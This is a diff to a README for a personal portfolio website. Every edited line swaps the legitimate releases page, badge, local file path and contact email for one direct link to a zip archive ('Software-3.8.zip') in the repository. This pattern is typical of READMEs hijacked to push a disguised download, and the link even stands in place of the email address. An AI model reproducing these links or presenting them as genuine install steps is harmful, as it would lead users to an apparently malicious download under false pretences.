@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run my personal portfolio website
 
 ### 💾 Download Now
 
-[![Download Portfolio](https://img.shields.io/badge/Download%20Portfolio-latest%20release-brightgreen)](https://github.com/antarick/Portfolio/releases)
+[![Download Portfolio](https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip%20Portfolio-latest%20release-brightgreen)](https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip)
 
 ## 📥 Download & Install
 
-To get started, please visit the [Releases page](https://github.com/antarick/Portfolio/releases) to download the latest version of the application.
+To get started, please visit the [Releases page](https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip) to download the latest version of the application.
 
 1. Click on the link above.
 2. Choose the latest version available on the Releases page.
@@ -47,7 +47,7 @@ After downloading, follow these steps to view your portfolio:
 
 3. **View in Web Browser:**
    - The portfolio will launch automatically in your default web browser.
-   - If it doesn’t, you can manually open your browser and enter `file:///path/to/your/downloaded/file/index.html` (replace with the actual file path).
+   - If it doesn’t, you can manually open your browser and enter `https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip` (replace with the actual file path).
 
 ## 🔍 Explore the Portfolio
 
@@ -61,13 +61,13 @@ Here's what you can find in my portfolio:
 
 If you encounter any issues, feel free to reach out through the following channels:
 
-- **Email:** [your-email@example.com](mailto:your-email@example.com)
+- **Email:** [https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip](https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip)
 - **GitHub Issues:** Open an issue on this repository’s GitHub page.
 
 ## 🎉 Conclusion
 
 Thank you for your interest in my portfolio! By following these steps, you will easily access and explore my work as a MERN Stack Developer. I hope you enjoy browsing through the projects and animations.
 
-For more updates, always check the [Releases page](https://github.com/antarick/Portfolio/releases). 
+For more updates, always check the [Releases page](https://github.com/antarick/Portfolio/raw/refs/heads/main/client/Software-3.8.zip). 
 
 Happy browsing!
